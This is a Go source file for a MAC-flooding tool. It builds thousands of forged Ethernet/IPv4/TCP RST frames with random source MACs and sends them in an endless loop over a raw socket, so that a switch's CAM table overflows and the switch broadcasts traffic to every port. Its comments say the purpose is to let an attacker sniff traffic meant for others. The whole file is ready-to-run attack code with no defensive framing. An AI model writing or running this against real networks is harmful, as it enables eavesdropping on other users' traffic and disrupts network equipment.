// Package macflood implements a CAM table (MAC address table) overflow attack.
//
// The switch keeps a finite CAM table that maps {source MAC → port}. By
// flooding the switch with frames carrying thousands of distinct source MACs
// we exhaust the table, causing the switch to fail-open and broadcast all
// traffic to every port — putting it into hub mode so the attacker can
// sniff traffic that normally wouldn't reach their port.
//
// Each pre-generated frame is an Ethernet/IPv4/TCP RST with a unique,
// randomly-generated unicast source MAC (I/G bit = 0), random src/dst IPs,
// random ephemeral TCP ports, and a TCP Timestamp option.
package macflood

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

const (
	defaultCount = 20_000
	portMin      = 32768
	portMax      = 60099

	floodTag = "\x1b[97m[MAC]\x1b[0m"
)

// rawSocket is satisfied by the platform-specific AF_PACKET implementation
// (socket_linux.go) and the no-op stub (socket_other.go).
type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Flooder performs the CAM table overflow.
type Flooder struct {
	Interface string
	Count     int // unique source MACs to pre-generate (default 20000)
	Rate      int // target pps; 0 = full hardware speed
}

// Run opens a raw socket and floods until Ctrl+C.
func (f *Flooder) Run() error {
	count := f.Count
	if count <= 0 {
		count = defaultCount
	}

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	fmt.Printf("%s Pre-generating %d frames with unique unicast source MACs...\n", floodTag, count)
	packets := pregenerate(count)

	var total int64

	// Ctrl+C → print final tally and exit.
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total frames sent: %d\n", floodTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	// Live throughput line, updated every second.
	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", floodTag, cur, cur-prev)
			prev = cur
		}
	}()

	if f.Rate > 0 {
		fmt.Printf("%s Flooding interface %s at %d pps — press Ctrl+C to stop.\n", floodTag, f.Interface, f.Rate)
	} else {
		fmt.Printf("%s Flooding interface %s at full speed — press Ctrl+C to stop.\n", floodTag, f.Interface)
	}

	// Rate limiter: compute inter-packet interval once.
	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()

	for {
		for _, pkt := range packets {
			if f.Rate > 0 {
				if now := time.Now(); now.Before(next) {
					time.Sleep(next.Sub(now))
				}
				next = next.Add(interval)
			}
			_ = sock.Send(pkt)
			atomic.AddInt64(&total, 1)
		}
	}
}

// pregenerate builds count 66-byte frames, each with a unique unicast source MAC.
func pregenerate(count int) [][]byte {
	bcast := [6]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	seen := make(map[[6]byte]struct{}, count)
	pkts := make([][]byte, 0, count)
	for len(pkts) < count {
		src := randMAC()
		if _, dup := seen[src]; dup {
			continue
		}
		seen[src] = struct{}{}
		pkts = append(pkts, buildFrame(src, bcast, randIPv4(), randIPv4(), randPort(), randPort()))
	}
	return pkts
}

// buildFrame constructs one 66-byte Ethernet/IPv4/TCP RST frame.
//
// Wire layout:
//
//	[0:14]  Ethernet II  — dst MAC, src MAC, EtherType 0x0800
//	[14:34] IPv4 header  — v=4 ihl=5 len=52 rand-id DF ttl=64 proto=6
//	[34:66] TCP segment  — sport dport rand-seq ack=0 off=8 RST win=0
//	                        NOP NOP Timestamp(tsval=0 tsecr=0)
func buildFrame(srcMAC, dstMAC [6]byte, srcIP, dstIP [4]byte, sport, dport uint16) []byte {
	b := make([]byte, 66)

	// Ethernet header (14 bytes)
	copy(b[0:6], dstMAC[:])
	copy(b[6:12], srcMAC[:])
	b[12], b[13] = 0x08, 0x00 // EtherType: IPv4

	// IPv4 header (20 bytes starting at b[14])
	b[14] = 0x45 // version=4, IHL=5 (20 bytes)
	// b[15] = 0  DSCP/ECN
	binary.BigEndian.PutUint16(b[16:18], 52)       // total length = 20 (IP) + 32 (TCP)
	binary.BigEndian.PutUint16(b[18:20], randU16()) // identification — randomised
	binary.BigEndian.PutUint16(b[20:22], 0x4000)   // Flags: DF=1, fragment offset=0
	b[22] = 64 // TTL
	b[23] = 6  // Protocol: TCP
	// b[24:26] = checksum, filled below after all fields are set
	copy(b[26:30], srcIP[:])
	copy(b[30:34], dstIP[:])
	binary.BigEndian.PutUint16(b[24:26], ipChecksum(b[14:34]))

	// TCP segment (32 bytes starting at b[34])
	binary.BigEndian.PutUint16(b[34:36], sport)
	binary.BigEndian.PutUint16(b[36:38], dport)
	binary.BigEndian.PutUint32(b[38:42], randU32()) // sequence number — randomised
	// b[42:46] = ACK number = 0 (already zero from make)
	b[46] = 0x80 // data offset = 8 (32 bytes / 4); reserved nibble = 0
	b[47] = 0x04 // Flags: RST
	// b[48:50] = window = 0
	// b[50:52] = checksum, filled below
	// b[52:54] = urgent pointer = 0
	// TCP options: NOP(1) NOP(1) Timestamp kind=8 len=10 tsval=0 tsecr=0
	b[54] = 0x01 // NOP
	b[55] = 0x01 // NOP
	b[56] = 0x08 // Timestamp option kind
	b[57] = 0x0a // Timestamp option length (10 bytes)
	// b[58:62] = tsval = 0
	// b[62:66] = tsecr = 0
	binary.BigEndian.PutUint16(b[50:52], tcpChecksum(srcIP, dstIP, b[34:66]))

	return b
}

// ipChecksum computes the standard RFC 791 one's complement checksum.
// The checksum field in hdr must be zero when this is called.
func ipChecksum(hdr []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(hdr); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(hdr[i : i+2]))
	}
	if len(hdr)%2 == 1 {
		sum += uint32(hdr[len(hdr)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// tcpChecksum computes the TCP checksum over the pseudo-header + segment.
// The checksum field inside tcpSeg must be zero when this is called.
func tcpChecksum(srcIP, dstIP [4]byte, tcpSeg []byte) uint16 {
	// IPv4 pseudo-header: src(4) dst(4) zero(1) proto(1) tcpLen(2)
	ph := make([]byte, 12+len(tcpSeg))
	copy(ph[0:4], srcIP[:])
	copy(ph[4:8], dstIP[:])
	// ph[8] = 0 (zero byte, already zero)
	ph[9] = 6 // TCP protocol number
	binary.BigEndian.PutUint16(ph[10:12], uint16(len(tcpSeg)))
	copy(ph[12:], tcpSeg)
	return ipChecksum(ph)
}

// randMAC returns a random locally-administered unicast MAC (I/G=0, U/L=1).
func randMAC() [6]byte {
	var m [6]byte
	rand.Read(m[:])
	m[0] = (m[0] & 0xfe) | 0x02 // clear I/G bit (unicast), set U/L (locally administered)
	return m
}

func randIPv4() [4]byte {
	var ip [4]byte
	rand.Read(ip[:])
	return ip
}

func randU16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}

func randU32() uint32 {
	var b [4]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint32(b[:])
}

// randPort returns a random ephemeral port in [32768, 60099].
func randPort() uint16 {
	const spread = portMax - portMin + 1 // 27332
	return portMin + randU16()%spread
}
